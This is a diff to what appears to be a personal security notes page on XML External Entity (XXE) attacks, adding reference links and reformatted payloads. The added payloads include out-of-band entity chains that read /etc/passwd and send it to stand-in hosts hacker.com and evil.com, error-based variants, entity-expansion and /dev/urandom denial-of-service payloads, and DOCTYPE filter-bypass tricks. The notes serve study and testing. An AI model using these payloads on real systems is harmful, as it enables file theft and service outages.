@@ -23,6 +23,7 @@ permalink: /infosec/xxe.html
 - XSLT Processing Security and SSRF. Emanuel Duss, Roland Bischofberger, OWASP 2015 (contains a lot of information about XSLT vulnerabilities)
 - [OWASP XXE Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
 - [XXE cheat sheet (web-in-security)](http://web-in-security.blogspot.ru/2016/03/xxe-cheat-sheet.html)
+- [XXE Payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
 
 <br>
 ***Note***: XSLT is a large separate topic, which must be investigated seprately and finalize in separate article.
@@ -109,8 +110,8 @@ XSLT - eXtensible Stylesheet Language Transformations
 ### XXE targets:
 
 - web-servers (even in deep backend)
-- xml-based documents: docx, pptx, odt, etc. (exist tools e.g. [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)) <br>
-    *For Open XML formats better to target `[Content_Types].xml` file for XXE injections.*
+- xml-based documents: docx, pptx, odt, etc. (exist tools e.g. [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)) (microsoft office xxe)
+    <br> *For Open XML formats better to target `[Content_Types].xml` file for XXE injections.*
 
 - databases (mysql, postgresql, ...)
 - XMP (Extensible Metadata Platform) in images (gif, png, jpg, ...)
@@ -163,17 +164,71 @@ XXE nature allows to target several protocols and several files at a time (becau
 
 - **Out-Of-Band** - using XML entities, data from server can be grabbed and sent to hacker.com (**NO** server output required)
 
-    document.xml
+    Approach 1:
 
+    *   document.xml
+
+        ```
         <!DOCTYPE root [
             <!ENTITY % remote SYSTEM "http://hacker.com/evil.dtd">
             %remote; %intern; %xxe;
         ]>
+        ```
 
-    http://hacker.com/evil.dtd
+        `<root>&xxe;</root>` - you can change `xxe` entity to general entity
 
+    *   http://hacker.com/evil.dtd
+
+        ```
         <!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
         <!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'http://hacker.com/result-is?%payl;'>">
+        ```
+
+        `<!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'file://%payl;'>">` - consider error-based
+
+    Approach 2:
+
+    *   document.xml
+
+        ```
+        <!DOCTYPE root [
+            <!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+            <!ENTITY % remote SYSTEM "http://hacker.com/evil.dtd">
+            %remote; %intern; %xxe;
+        ]>
+        ```
+
+        `<root>&xxe;</root>` - you can change `xxe` entity to general entity
+
+    *   http://hacker.com/evil.dtd
+
+        ```
+        <!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'http://hacker.com/result-is?%payl;'>">
+        ```
+
+        `<!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'file://%payl;'>">` - consider error-based
+
+    Approach 3 (*does it really work?*):
+
+    *   CDATA inside xml
+
+        ```
+        <root>
+            <![CDATA[
+                <!ENTITY % stuff SYSTEM "file:///var/www/html/app/WEB-INF/ApplicationContext.xml">
+            ]]>
+        </root>
+        ```
+
+        ```
+        <![CDATA[
+            <!DOCTYPE doc [
+                <!ENTITY % dtd SYSTEM "http://evil.com/">
+                %dtd;
+            ]>
+            <xxx/> <-- ???
+        ]]>
+        ```
 
     ("Detected an entity reference loop" error must be carefully bypassed)
 
@@ -185,23 +240,37 @@ XXE nature allows to target several protocols and several files at a time (becau
 
     Using XML entities, server memory resource can be exhausted by constructing long entity value.
 
-        <?xml version="1.0"?>
-        <!DOCTYPE root [
-            <!ENTITY hifi "hifi">
-            <!ENTITY hifi1 "&hifi;&hifi;&hifi;">
-            <!ENTITY hifi2 "&hifi1;&hifi1;&hifi1;">
-            <!ENTITY hifi3 "&hifi2;&hifi2;&hifi2;">
-        ]>
-        <root>&hifi3;</root>
+    ```
+    <?xml version="1.0"?>
+    <!DOCTYPE root [
+        <!ENTITY hifi "hifi">
+        <!ENTITY hifi1 "&hifi;&hifi;&hifi;">
+        <!ENTITY hifi2 "&hifi1;&hifi1;&hifi1;">
+        <!ENTITY hifi3 "&hifi2;&hifi2;&hifi2;">
+    ]>
+    <root>&hifi3;</root>
+    ```
 
     Linux local devices can be used:
 
-        <?xml version="1.0"?>
-        <!DOCTYPE root [
-            <!ENTITY xxe1 SYSTEM "/dev/urandom">
-            <!ENTITY xxe2 SYSTEM "/dev/zero">
-        ]>
-        <root>&xxe1;&xxe2;</root>
+    ```
+    <?xml version="1.0"?>
+    <!DOCTYPE root [
+        <!ENTITY xxe1 SYSTEM "/dev/urandom">
+        <!ENTITY xxe2 SYSTEM "/dev/zero">
+    ]>
+    <root>&xxe1;&xxe2;</root>
+    ```
+
+    Does recursion available?
+
+    ```
+    <!DOCTYPE data [
+    <!ENTITY a "a&b;" >
+    <!ENTITY b "&a;" >
+    ]>
+    <data>&a;</data>
+    ```
 
     <br>
 
@@ -665,6 +734,12 @@ Xerces parser XXE mitigation:
 - change encoding for example on UTF-16, UTF-7, etc.
     
     `<?xml version="1.0" encoding="UTF-16"?>`
+
+- tampering with names (*[XXE payloads](https://gist.github.com/staaldraad/01415b990939494879b4)*):
+    
+    `<!DOCTYPE :. SYTEM "http://"`
+    `<!DOCTYPE :_-_: SYTEM "http://"`
+    `<!DOCTYPE {0xdfbf} SYSTEM "http://"`
 
 <br>
 
